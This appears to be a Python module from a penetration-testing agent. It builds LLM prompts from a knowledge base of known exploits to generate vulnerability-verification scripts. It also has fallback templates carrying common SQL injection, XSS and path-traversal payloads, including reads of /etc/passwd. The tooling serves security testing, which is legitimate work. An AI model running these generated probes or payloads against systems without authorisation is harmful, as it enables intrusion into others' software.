"""
Pentest Agent - POC Generator
基于 RAG 知识库和 Skills 生成漏洞验证 POC
"""

import json
import re
from typing import Dict, List, Optional, Any
from dataclasses import dataclass

from config.minimax_config import get_llm


@dataclass
class POCRequest:
    """POC生成请求"""
    target: str
    vulnerability_name: str
    cve_id: Optional[str] = None
    tech_stack: List[str] = None
    skill_content: Optional[str] = None
    existing_poc: Optional[str] = None


@dataclass
class POCResult:
    """POC生成结果"""
    poc_code: str
    explanation: str
    verification_steps: List[str]
    risk_level: str  # low, medium, high, critical
    needs_approval: bool


class POCGenerator:
    """
    POC 生成器

    基于以下信息生成漏洞验证 POC：
    1. RAG 知识库中的已知漏洞 POC
    2. Hack-skills 中的攻击技能知识
    3. 目标技术栈
    """

    def __init__(self):
        self.llm = get_llm()

    def generate_poc(self, request: POCRequest) -> POCResult:
        """
        生成 POC

        Args:
            request: POC生成请求

        Returns:
            POCResult: POC生成结果
        """
        # 1. 从知识库获取已知 POC
        known_poc = request.existing_poc or self._find_known_poc(request)

        # 2. 从 skills 获取攻击模式
        attack_pattern = request.skill_content or self._get_attack_pattern(request)

        # 3. 使用 LLM 生成/优化 POC
        poc_code, explanation, risk = self._generate_with_llm(
            request, known_poc, attack_pattern
        )

        # 4. 生成验证步骤
        verification_steps = self._generate_verification_steps(
            request.target, poc_code, request.vulnerability_name
        )

        # 5. 判断是否需要审批（高危操作）
        needs_approval = risk in ["high", "critical"]

        return POCResult(
            poc_code=poc_code,
            explanation=explanation,
            verification_steps=verification_steps,
            risk_level=risk,
            needs_approval=needs_approval,
        )

    def _find_known_poc(self, request: POCRequest) -> Optional[str]:
        """从 RAG 知识库查找已知 POC"""
        try:
            from rag.query_interface import get_rag_interface
            rag = get_rag_interface()

            # 按 CVE 或漏洞名查询
            query = request.cve_id or request.vulnerability_name
            result = rag.query(query, n_results=5, sources=["poc"])

            for vuln in result.vulnerabilities:
                if vuln.poc_content:
                    return vuln.poc_content

        except Exception as e:
            print(f"[POCGenerator] 查询POC失败: {e}")

        return None

    def _get_attack_pattern(self, request: POCRequest) -> Optional[str]:
        """从 Skills 获取攻击模式"""
        try:
            from agents.skill_loader import get_skill_loader
            loader = get_skill_loader()

            # 根据技术栈匹配技能
            target_info = {
                "tech": request.tech_stack or [],
                "keywords": [request.vulnerability_name],
            }

            matched = loader.match_skills(target_info)

            if matched:
                # 返回最相关的技能内容
                skill_name = matched[0]["name"]
                return loader.get_skill_content(skill_name)

        except Exception as e:
            print(f"[POCGenerator] 获取攻击模式失败: {e}")

        return None

    def _generate_with_llm(
        self,
        request: POCRequest,
        known_poc: Optional[str],
        attack_pattern: Optional[str]
    ) -> tuple[str, str, str]:
        """使用 LLM 生成 POC"""

        # 构建提示
        prompt_parts = [
            f"目标: {request.target}",
            f"漏洞: {request.vulnerability_name}",
        ]

        if request.cve_id:
            prompt_parts.append(f"CVE: {request.cve_id}")

        if request.tech_stack:
            prompt_parts.append(f"技术栈: {', '.join(request.tech_stack)}")

        prompt_parts.append("\n已知 POC 信息:")
        if known_poc:
            prompt_parts.append(known_poc[:1000])
        else:
            prompt_parts.append("无")

        prompt_parts.append("\n攻击模式知识:")
        if attack_pattern:
            # 只取关键部分
            prompt_parts.append(attack_pattern[:1500])
        else:
            prompt_parts.append("无特定攻击模式")

        prompt_parts.append("""
请生成一个漏洞验证 POC，要求：
1. Python 脚本，可直接运行
2. 包含目标 URL、payload、验证逻辑
3. 使用 requests 库发送请求
4. 结果输出清晰
5. 风险可控，不造成实际破坏

请用以下格式返回：
```python
# POC 代码
```
---
风险等级: low/medium/high/critical
---
简要说明: ...
""")

        prompt = "\n".join(prompt_parts)

        try:
            response = self.llm.chat(
                prompt=prompt,
                system_prompt="你是一个渗透测试专家，擅长生成漏洞验证 POC 代码。生成的 POC 必须：\n1. 仅用于验证目的，不造成实际破坏\n2. 代码清晰易读\n3. 有明确的成功/失败判断\n4. 包含必要的错误处理"
            )

            return self._parse_llm_response(response)

        except Exception as e:
            print(f"[POCGenerator] LLM 生成失败: {e}")
            return self._generate_fallback_poc(request)

    def _parse_llm_response(self, response: str) -> tuple[str, str, str]:
        """解析 LLM 响应"""
        poc_code = ""
        explanation = "基于 LLM 生成"
        risk = "medium"

        # 提取代码块
        code_match = re.search(r'```python\n(.*?)\n```', response, re.DOTALL)
        if code_match:
            poc_code = code_match.group(1)

        # 提取风险等级
        risk_match = re.search(r'风险等级:\s*(low|medium|high|critical)', response, re.IGNORECASE)
        if risk_match:
            risk = risk_match.group(1).lower()

        # 提取说明
        explain_match = re.search(r'简要说明:\s*(.+)', response, re.DOTALL)
        if explain_match:
            explanation = explain_match.group(1).strip()

        if not poc_code:
            poc_code = response

        return poc_code, explanation, risk

    def _generate_fallback_poc(self, request: POCRequest) -> tuple[str, str, str]:
        """生成备用 POC"""
        # 根据漏洞类型生成基础 POC
        vuln_lower = request.vulnerability_name.lower()

        if "sql" in vuln_lower or "sqli" in vuln_lower:
            poc = self._generate_sqli_poc(request)
        elif "xss" in vuln_lower:
            poc = self._generate_xss_poc(request)
        elif "lfi" in vuln_lower or "path" in vuln_lower:
            poc = self._generate_lfi_poc(request)
        else:
            poc = self._generate_basic_poc(request)

        return poc, "自动生成", "medium"

    def _generate_sqli_poc(self, request: POCRequest) -> str:
        """生成 SQL 注入 POC"""
        return f'''```python
#!/usr/bin/env python3
"""
SQL注入验证 POC - {request.vulnerability_name}
目标: {request.target}
"""
import requests
import sys

def verify_sqli(url):
    """验证SQL注入"""
    # 测试 payload
    payloads = [
        "' OR '1'='1",
        "' OR 1=1--",
        "1' AND '1'='1",
    ]

    for payload in payloads:
        try:
            # 根据实际参数调整
            params = {{"id": payload}}
            resp = requests.get(url, params=params, timeout=10)

            # 检测特征
            if "sql" in resp.text.lower() or "error" in resp.text.lower():
                print(f"[+] 发现SQL注入特征: {{payload}}")
                return True
        except Exception as e:
            print(f"[-] 请求失败: {{e}}")

    return False

if __name__ == "__main__":
    target = "{request.target}"
    if verify_sqli(target):
        print("[+] 目标存在SQL注入漏洞")
    else:
        print("[-] 未发现SQL注入")
```'''

    def _generate_xss_poc(self, request: POCRequest) -> str:
        """生成 XSS POC"""
        return f'''```python
#!/usr/bin/env python3
"""
XSS验证 POC - {request.vulnerability_name}
目标: {request.target}
"""
import requests

def verify_xss(url):
    """验证XSS"""
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
    ]

    for payload in xss_payloads:
        try:
            data = {{"input": payload}}
            resp = requests.post(url, data=data, timeout=10)

            if payload in resp.text:
                print(f"[+] 发现XSS: {{payload}}")
                return True
        except Exception as e:
            print(f"[-] 请求失败: {{e}}")

    return False

if __name__ == "__main__":
    target = "{request.target}"
    if verify_xss(target):
        print("[+] 目标存在XSS漏洞")
    else:
        print("[-] 未发现XSS")
```'''

    def _generate_lfi_poc(self, request: POCRequest) -> str:
        """生成 LFI POC"""
        return f'''```python
#!/usr/bin/env python3
"""
LFI验证 POC - {request.vulnerability_name}
目标: {request.target}
"""
import requests

def verify_lfi(url):
    """验证本地文件包含"""
    lfi_payloads = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "/etc/passwd",
    ]

    for payload in lfi_payloads:
        try:
            params = {{"file": payload}}
            resp = requests.get(url, params=params, timeout=10)

            if "root:" in resp.text or "[drivers]" in resp.text:
                print(f"[+] 发现LFI: {{payload}}")
                return True
        except Exception as e:
            print(f"[-] 请求失败: {{e}}")

    return False

if __name__ == "__main__":
    target = "{request.target}"
    if verify_lfi(target):
        print("[+] 目标存在LFI漏洞")
    else:
        print("[-] 未发现LFI")
```'''

    def _generate_basic_poc(self, request: POCRequest) -> str:
        """生成基础 POC"""
        return f'''```python
#!/usr/bin/env python3
"""
漏洞验证 POC - {request.vulnerability_name}
目标: {request.target}
"""
import requests

def verify_vulnerability(url):
    """验证漏洞"""
    try:
        resp = requests.get(url, timeout=10)
        # 根据漏洞类型自定义检测逻辑
        print(f"状态码: {{resp.status_code}}")
        print(f"响应长度: {{len(resp.text)}}")
        return True
    except Exception as e:
        print(f"[-] 请求失败: {{e}}")
        return False

if __name__ == "__main__":
    target = "{request.target}"
    verify_vulnerability(target)
```'''

    def _generate_verification_steps(
        self,
        target: str,
        poc_code: str,
        vuln_name: str
    ) -> List[str]:
        """生成验证步骤"""
        steps = [
            f"1. 确认目标: {target}",
            "2. 检查 POC 代码，确保理解每个 payload 的含义",
            f"3. 对非敏感参数执行 POC（如 ?id=1 这种）",
            "4. 观察响应，判断是否存在漏洞特征",
            "5. 记录验证结果（截图+响应数据）",
        ]

        if "sql" in vuln_name.lower():
            steps.insert(2, "2.5. 优先测试只读参数，避免对数据库进行修改")
        elif "xss" in vuln_name.lower():
            steps.insert(2, "2.5. 使用浏览器开发者工具观察 XSS 弹窗或 DOM 变化")

        return steps


# 全局单例
_poc_generator: Optional[POCGenerator] = None


def get_poc_generator() -> POCGenerator:
    """获取 POC 生成器单例"""
    global _poc_generator
    if _poc_generator is None:
        _poc_generator = POCGenerator()
    return _poc_generator
